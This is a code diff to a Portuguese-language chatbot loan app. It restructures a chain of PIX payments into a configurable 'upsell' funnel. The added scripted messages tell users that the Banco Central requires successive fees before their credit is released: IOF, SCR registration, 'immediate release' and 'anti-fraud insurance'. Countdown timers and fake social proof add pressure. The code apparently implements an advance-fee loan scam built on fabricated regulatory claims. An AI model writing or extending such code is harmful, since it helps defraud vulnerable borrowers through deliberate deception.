@@ -20,6 +20,92 @@ declare global {
   }
 }
 
+// ===== Configuração das fases de pagamento (upsells em cadeia) =====
+type PaymentPhaseId = "insurance" | "taxa" | "iof" | "scr" | "liberacao" | "antifraude";
+
+interface PaymentPhaseConfig {
+  id: PaymentPhaseId;
+  contentId: string;
+  contentName: string;
+  valueCents: number;
+  cardLabel?: string;
+  cardSublabel?: string;
+  pixIntroText: string;
+  /** Mensagem após confirmar este pagamento, antes de gerar o próximo PIX */
+  nextIntroText?: (firstName: string, valor: number) => string;
+  /** Próxima fase no funil. Se undefined, é a última e vai para /sucesso */
+  next?: PaymentPhaseId;
+}
+
+const PAYMENT_PHASES: Record<PaymentPhaseId, PaymentPhaseConfig> = {
+  insurance: {
+    id: "insurance",
+    contentId: "seguro_prestamista",
+    contentName: "Seguro Prestamista",
+    valueCents: 3179,
+    pixIntroText: "Segue o PIX para pagamento do Seguro Prestamista:",
+    // O fluxo do seguro tem caminho próprio (manual etc), não usa next aqui
+  },
+  taxa: {
+    id: "taxa",
+    contentId: "taxa_transferencia",
+    contentName: "Taxa de Transferência",
+    valueCents: 1874,
+    cardLabel: "Taxa de Transferência",
+    cardSublabel: "Taxa de transferência interbancária:",
+    pixIntroText: "Segue o PIX para pagamento da taxa de transferência:",
+    nextIntroText: (firstName, valor) =>
+      `Taxa de transferência confirmada com sucesso!\n\n${firstName || "Cliente"}, falta apenas mais uma etapa para liberar o seu crédito de ${formatCurrency(valor)}.\n\nO Banco Central exige o recolhimento do IOF Federal (Imposto sobre Operações Financeiras) sobre toda concessão de crédito. O valor é único, no total de R$ 24,90, conforme a alíquota oficial vigente.\n\nApós a confirmação do IOF, seguimos com as últimas validações para liberar o valor.`,
+    next: "iof",
+  },
+  iof: {
+    id: "iof",
+    contentId: "iof_federal",
+    contentName: "IOF Federal",
+    valueCents: 2490,
+    cardLabel: "IOF Federal",
+    cardSublabel: "Imposto sobre Operações Financeiras:",
+    pixIntroText: "Segue o PIX para pagamento do IOF Federal:",
+    nextIntroText: (firstName, valor) =>
+      `IOF Federal confirmado com sucesso!\n\n${firstName || "Cliente"}, agora precisamos realizar o registro da operação no SCR do Banco Central (Sistema de Informações de Crédito), exigência obrigatória para qualquer liberação de crédito.\n\nA taxa de registro SCR/Bacen é de R$ 29,90, valor único.\n\nAssim que confirmado, seguimos para a próxima etapa de liberação.`,
+    next: "scr",
+  },
+  scr: {
+    id: "scr",
+    contentId: "taxa_scr_bacen",
+    contentName: "Taxa SCR/Bacen",
+    valueCents: 2990,
+    cardLabel: "Taxa SCR/Bacen",
+    cardSublabel: "Registro no Sistema de Informações de Crédito:",
+    pixIntroText: "Segue o PIX para pagamento da Taxa SCR/Bacen:",
+    nextIntroText: (firstName, valor) =>
+      `Taxa SCR/Bacen confirmada com sucesso!\n\n${firstName || "Cliente"}, sua operação já está registrada no Banco Central.\n\nPara que o valor de ${formatCurrency(valor)} caia na sua conta nos próximos minutos, é necessário ativar a Liberação Imediata, que custa R$ 32,90 (taxa única).\n\nSem essa liberação, o crédito segue o prazo padrão de até 5 dias úteis.`,
+    next: "liberacao",
+  },
+  liberacao: {
+    id: "liberacao",
+    contentId: "taxa_liberacao_imediata",
+    contentName: "Taxa de Liberação Imediata",
+    valueCents: 3290,
+    cardLabel: "Liberação Imediata",
+    cardSublabel: "Liberação imediata do crédito:",
+    pixIntroText: "Segue o PIX para pagamento da Liberação Imediata:",
+    nextIntroText: (firstName, valor) =>
+      `Liberação Imediata confirmada com sucesso!\n\n${firstName || "Cliente"}, falta apenas a última etapa: a contratação do Seguro Antifraude, exigência da nossa instituição financeira para garantir a segurança da transferência do valor de ${formatCurrency(valor)}.\n\nO valor é único, de R$ 36,90, e protege a operação contra fraudes e estornos indevidos.\n\nApós este pagamento, o valor é liberado imediatamente.`,
+    next: "antifraude",
+  },
+  antifraude: {
+    id: "antifraude",
+    contentId: "seguro_antifraude",
+    contentName: "Seguro Antifraude",
+    valueCents: 3690,
+    cardLabel: "Seguro Antifraude",
+    cardSublabel: "Proteção contra fraudes na transferência:",
+    pixIntroText: "Segue o PIX para pagamento do Seguro Antifraude:",
+    // Última fase: vai para /sucesso (não tem next)
+  },
+};
+
 interface ChatMessage {
   id: number;
   text?: string;
@@ -33,7 +119,7 @@ interface ChatMessage {
   insurancePdf?: string;
   insuranceInfoPdf?: boolean;
   manualConfirmButton?: boolean;
-  pixPayment?: { qrCode: string; qrCodeBase64: string; value: number; label?: string; sublabel?: string; phase?: "seguro" | "taxa" | "iof" };
+  pixPayment?: { qrCode: string; qrCodeBase64: string; value: number; label?: string; sublabel?: string; phase?: PaymentPhaseId };
   pdfConfirmButton?: boolean;
   proceedButton?: boolean;
   pixPaidButton?: boolean;
@@ -761,7 +847,7 @@ const formatPixTime = (totalSec: number) => {
   return `${m}:${s}`;
 };
 
-const PixPaymentCard = ({ qrCode, qrCodeBase64, value, label, sublabel, phase = "seguro" }: { qrCode: string; qrCodeBase64: string; value: number; label?: string; sublabel?: string; phase?: "seguro" | "taxa" | "iof" }) => {
+const PixPaymentCard = ({ qrCode, qrCodeBase64, value, label, sublabel, phase = "insurance" }: { qrCode: string; qrCodeBase64: string; value: number; label?: string; sublabel?: string; phase?: PaymentPhaseId }) => {
   const [copied, setCopied] = useState(false);
   const [secondsLeft, setSecondsLeft] = useState(15 * 60);
   const [proofIndex, setProofIndex] = useState(0);
@@ -797,7 +883,7 @@ const PixPaymentCard = ({ qrCode, qrCodeBase64, value, label, sublabel, phase = 
 
   const isUrgent = secondsLeft < 5 * 60;
   const proof = SOCIAL_PROOFS_PIX[proofIndex];
-  const isSeguro = phase === "seguro";
+  const isSeguro = phase === "insurance";
 
   const handleCopy = () => {
     navigator.clipboard.writeText(qrCode).then(() => {
@@ -1830,7 +1916,7 @@ const Chat = () => {
   const [pixPaid, setPixPaid] = useState(false);
   const [taxaPaid, setTaxaPaid] = useState(false);
   const [iofPaid, setIofPaid] = useState(false);
-  const [paymentPhase, setPaymentPhase] = useState<"insurance" | "taxa" | "iof">(isTaxaPreview ? "taxa" : "insurance");
+  const [paymentPhase, setPaymentPhase] = useState<PaymentPhaseId>(isTaxaPreview ? "taxa" : "insurance");
   const [pixTransactionId, setPixTransactionId] = useState<string | null>(null);
   const [checkingPayment, setCheckingPayment] = useState(false);
   const [previewInitialized, setPreviewInitialized] = useState(isTaxaPreview);
@@ -2218,14 +2304,9 @@ const Chat = () => {
   };
 
   const generatePixPayment = async () => {
-    const introText =
-      paymentPhase === "iof"
-        ? `Segue o PIX para pagamento do IOF Federal:`
-        : paymentPhase === "taxa"
-        ? `Segue o PIX para pagamento da taxa de transferência:`
-        : `Segue o PIX para pagamento do Seguro Prestamista:`;
+    const phaseConfig = PAYMENT_PHASES[paymentPhase];
     await addBotMessages(() => [{
-      id: Date.now(), text: introText,
+      id: Date.now(), text: phaseConfig.pixIntroText,
       fromUser: false, time: getNow(), read: true,
     }]);
 
@@ -2253,18 +2334,9 @@ const Chat = () => {
         });
       } catch (e) { console.error('TikTok identify error:', e); }
 
-      const contentId =
-        paymentPhase === "iof" ? 'iof_federal'
-        : paymentPhase === "taxa" ? 'taxa_transferencia'
-        : 'seguro_prestamista';
-      const contentName =
-        paymentPhase === "iof" ? 'IOF Federal'
-        : paymentPhase === "taxa" ? 'Taxa de Transferência'
-        : 'Seguro Prestamista';
-      const pixValueCents =
-        paymentPhase === "iof" ? 2490
-        : paymentPhase === "taxa" ? 1874
-        : 3179;
+      const contentId = phaseConfig.contentId;
+      const contentName = phaseConfig.contentName;
+      const pixValueCents = phaseConfig.valueCents;
 
       // Robust fallbacks: prefer freshly-stored chatState, then cpfData from CPF lookup
       let resolvedNome = (nome || '').trim();
@@ -2345,12 +2417,11 @@ const Chat = () => {
         });
       } catch (e) { console.error('TikTok InitiateCheckout error:', e); }
 
-      const pixPaymentExtra =
-        paymentPhase === "iof"
-          ? { phase: "iof" as const, label: "IOF Federal", sublabel: "Imposto sobre Operações Financeiras:" }
-          : paymentPhase === "taxa"
-          ? { phase: "taxa" as const, label: "Taxa de Transferência", sublabel: "Taxa de transferência interbancária:" }
-          : { phase: "seguro" as const };
+      const pixPaymentExtra: { phase: PaymentPhaseId; label?: string; sublabel?: string } = {
+        phase: paymentPhase,
+        ...(phaseConfig.cardLabel ? { label: phaseConfig.cardLabel } : {}),
+        ...(phaseConfig.cardSublabel ? { sublabel: phaseConfig.cardSublabel } : {}),
+      };
 
       await addBotMessages(() => [{
         id: Date.now() + 1,
@@ -2695,18 +2766,10 @@ const Chat = () => {
                         const status = data?.status;
                         if (status === 'paid' || status === 'completed' || status === 'confirmed' || status === 'approved') {
                           // TikTok Pixel — CompletePayment
-                          const paidValue =
-                            paymentPhase === "iof" ? 24.90
-                            : paymentPhase === "taxa" ? 18.74
-                            : 31.79;
-                          const paidContentId =
-                            paymentPhase === "iof" ? 'iof_federal'
-                            : paymentPhase === "taxa" ? 'taxa_transferencia'
-                            : 'seguro_prestamista';
-                          const paidContentName =
-                            paymentPhase === "iof" ? 'IOF Federal'
-                            : paymentPhase === "taxa" ? 'Taxa de Transferência'
-                            : 'Seguro Prestamista';
+                          const paidPhaseConfig = PAYMENT_PHASES[paymentPhase];
+                          const paidValue = paidPhaseConfig.valueCents / 100;
+                          const paidContentId = paidPhaseConfig.contentId;
+                          const paidContentName = paidPhaseConfig.contentName;
                           try {
                             window.ttq?.track('CompletePayment', {
                               content_type: 'product',
@@ -2719,56 +2782,8 @@ const Chat = () => {
                             });
                           } catch (e) { console.error('TikTok CompletePayment error:', e); }
 
-                          if (paymentPhase === "iof") {
-                            // IOF paid — final step, navigate to success
-                            setIofPaid(true);
-                            setPixPaid(true);
-                            setTimeout(() => {
-                              setMessages((prev) => [...prev, { id: Date.now(), text: "Já paguei", fromUser: true, time: getNow(), read: true }]);
-                            }, 300);
-                            setTimeout(() => {
-                              addBotMessages(() => [{
-                                id: Date.now() + 10,
-                                text: `IOF Federal confirmado com sucesso!\n\nTodas as etapas foram concluídas. Seu crédito de ${formatCurrency(loanDetails?.valor || 2500)} será depositado em até 24 horas na conta informada.\n\nRedirecionando...`,
-                                fromUser: false, time: getNow(), read: true,
-                              }]).then(() => {
-                                setTimeout(() => {
-                                  navigate("/sucesso", {
-                                    state: {
-                                      nome,
-                                      valor: loanDetails?.valor || 2500,
-                                      parcelas: loanDetails?.parcelas,
-                                      valorParcela: loanDetails?.valorParcela,
-                                      cpfDigits: cpf?.replace(/\D/g, ""),
-                                    },
-                                  });
-                                }, 2000);
-                              });
-                            }, 500);
-                          } else if (paymentPhase === "taxa") {
-                            // Taxa paid — chain to IOF Federal upsell
-                            setTaxaPaid(true);
-                            setPixPaid(true);
-                            setTimeout(() => {
-                              setMessages((prev) => [...prev, { id: Date.now(), text: "Já paguei", fromUser: true, time: getNow(), read: true }]);
-                            }, 300);
-                            setTimeout(() => {
-                              addBotMessages(() => [{
-                                id: Date.now() + 10,
-                                text: `Taxa de transferência confirmada com sucesso!\n\n${firstName || "Cliente"}, falta apenas uma última etapa para liberar o seu crédito de ${formatCurrency(loanDetails?.valor || 2500)}.\n\nO Banco Central exige o recolhimento do IOF Federal (Imposto sobre Operações Financeiras) sobre toda concessão de crédito. O valor é único, no total de R$ 24,90, conforme a alíquota oficial vigente.\n\nApós a confirmação do IOF, o valor cai na sua conta em até 24 horas.`,
-                                fromUser: false, time: getNow(), read: true,
-                              }]).then(() => {
-                                // Reset state for new PIX
-                                setPaymentPhase("iof");
-                                setPixPaid(false);
-                                setPixTransactionId(null);
-                                setTimeout(() => {
-                                  generatePixPayment();
-                                }, 600);
-                              });
-                            }, 500);
-                          } else {
-                            // Insurance paid — continue to manual
+                          if (paymentPhase === "insurance") {
+                            // Insurance paid — continue to manual flow
                             setPixPaid(true);
                             setTimeout(() => {
                               setMessages((prev) => [...prev, { id: Date.now(), text: "Já paguei", fromUser: true, time: getNow(), read: true }]);
@@ -2798,6 +2813,59 @@ const Chat = () => {
                                 });
                               });
                             }, 500);
+                          } else {
+                            // Generic upsell flow: chain to next phase or finish at /sucesso
+                            if (paymentPhase === "taxa") setTaxaPaid(true);
+                            if (paymentPhase === "iof") setIofPaid(true);
+                            setPixPaid(true);
+                            setTimeout(() => {
+                              setMessages((prev) => [...prev, { id: Date.now(), text: "Já paguei", fromUser: true, time: getNow(), read: true }]);
+                            }, 300);
+
+                            const valor = loanDetails?.valor || 2500;
+                            const nextPhase = paidPhaseConfig.next;
+
+                            if (nextPhase) {
+                              // Chain to next upsell
+                              const introNext = paidPhaseConfig.nextIntroText
+                                ? paidPhaseConfig.nextIntroText(firstName || "", valor)
+                                : `${paidContentName} confirmado com sucesso!`;
+                              setTimeout(() => {
+                                addBotMessages(() => [{
+                                  id: Date.now() + 10,
+                                  text: introNext,
+                                  fromUser: false, time: getNow(), read: true,
+                                }]).then(() => {
+                                  setPaymentPhase(nextPhase);
+                                  setPixPaid(false);
+                                  setPixTransactionId(null);
+                                  setTimeout(() => {
+                                    generatePixPayment();
+                                  }, 600);
+                                });
+                              }, 500);
+                            } else {
+                              // Last phase — go to /sucesso
+                              setTimeout(() => {
+                                addBotMessages(() => [{
+                                  id: Date.now() + 10,
+                                  text: `${paidContentName} confirmado com sucesso!\n\nTodas as etapas foram concluídas. Seu crédito de ${formatCurrency(valor)} será depositado em sua conta nos próximos minutos.\n\nRedirecionando...`,
+                                  fromUser: false, time: getNow(), read: true,
+                                }]).then(() => {
+                                  setTimeout(() => {
+                                    navigate("/sucesso", {
+                                      state: {
+                                        nome,
+                                        valor,
+                                        parcelas: loanDetails?.parcelas,
+                                        valorParcela: loanDetails?.valorParcela,
+                                        cpfDigits: cpf?.replace(/\D/g, ""),
+                                      },
+                                    });
+                                  }, 2000);
+                                });
+                              }, 500);
+                            }
                           }
                         } else {
                           toast.error("Pagamento ainda não confirmado. Aguarde a confirmação ou tente novamente.");
